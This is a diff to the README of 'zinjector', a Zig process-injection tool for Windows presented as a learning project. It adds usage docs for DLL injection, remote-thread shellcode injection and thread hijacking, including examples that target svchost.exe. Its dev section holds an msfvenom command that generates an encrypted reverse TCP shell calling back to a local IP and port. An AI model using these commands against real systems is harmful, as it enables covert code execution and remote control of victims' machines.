@@ -2,10 +2,125 @@
 
 Simple Process injector for Windows (for now) written in Zig.
 
-## DISCLAIMER
 
-This is my first project in Zig so the code is pretty mmmm rude(?). The goal is to learn Zig and perform process injection.
-I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple process injection attack on windows.
+> [!NOTE]
+> This is my first project in Zig so the code is pretty mmmm rude(?). The goal is to learn Zig and perform process injection.
+> I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple process injection attack on windows.
+
+## Usage
+
+### General syntax
+
+```sh
+zinjector <subcommand> [OPTIONS]
+```
+
+Most common:
+
+* `zinjector --help` — general help
+* `zinjector <subcommand> --help` — help for a subcommand
+
+---
+
+### Subcommands
+
+#### `dll`
+
+Performs a DLL injection into the target process.
+
+Syntax:
+
+```sh
+zinjector dll --dll_path <path> (--pid <PID> | --process_name <name>)
+```
+
+Options:
+
+* `--dll_path, -d` *(required)* — path to the DLL (e.g. `C:\tools\payload.dll`)
+* `--pid, -p` — numeric PID of the target process
+* `--process_name, -n` — executable name of the target process (e.g. `notepad.exe`)
+
+Examples:
+
+```sh
+zinjector dll -d "C:\payloads\hook.dll" -p 1234
+zinjector dll -d ./payload.dll -n notepad.exe
+```
+
+Notes:
+
+* Provide **either** `--pid` **or** `--process_name`. If both are provided, behavior depends on implementation (prefer PID for precision).
+* Ensure the DLL architecture (x86/x64) matches the target process architecture.
+* Administrative privileges may be required.
+
+---
+
+#### `thread`
+
+Creates a remote thread in the target process and runs an in-memory payload (shellcode).
+
+Syntax:
+
+```sh
+zinjector thread (--pid <PID> | --process_name <name>)
+```
+
+Options:
+
+* `--pid, -p` — numeric PID of the target process
+* `--process_name, -n` — executable name of the target process
+
+Examples:
+
+```sh
+zinjector thread -p 4321
+zinjector thread -n Notepad.exe
+```
+
+Notes:
+
+* The payload (shellcode) must be provided or obtained according to the implementation (file, stdin, embedded).
+* Verify architecture and calling convention compatibility.
+* Elevated privileges may be necessary.
+
+---
+
+#### `hijacking`
+
+Performs thread hijacking: suspends a target thread, modifies its context, and resumes it to execute the payload.
+
+Syntax:
+
+```sh
+zinjector hijacking --pid <PID>
+```
+
+Options:
+
+* `--pid, -p` — numeric PID of the target process (recommended)
+
+Examples:
+
+```sh
+zinjector hijacking -p 5555
+```
+
+---
+
+### Full examples
+
+```sh
+# Inject DLL by PID
+zinjector dll -d "C:\tools\inject.dll" -p 1010
+
+# Run shellcode via remote thread by process name
+zinjector thread -n svchost.exe
+
+# Hijack thread in process
+zinjector hijacking -p 2020
+```
+
+---
 
 ## Some cool resource for learning Zig and Process Injection
 
@@ -20,6 +135,10 @@ I haven't decided what to implement yet, but the first steps are to learn Zig an
 - https://raw.githubusercontent.com/marlersoft/zigwin32/refs/heads/main/win32/everything.zig
 - https://black-hat-zig.cx330.tw/
 - https://privdayz.com/tools/shellcode-gen
+
+### Legal and safety warning
+
+These techniques modify other processes and can be used maliciously. Use only on machines and processes for which you have explicit authorization. The author assumes no responsibility for misuse.
 
 ## Dev
 
@@ -40,8 +159,8 @@ Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc
 - [ ] SetWindowHookEx Code Injection
 - [ ] ...
 
-## Command:
+## Command for dev/testing:
 
-- Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
+- Compile: `zig build -Dtarget=x86_64-windows -Dport=8080 -Dipv4=172.19.192.194 -Doptimize=ReleaseSmall --summary all`
 - Test: `zig build test --summary all`
 - Shellcode generator: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.118 LPORT=8080 -f zig --encrypt xor --encrypt-key a`
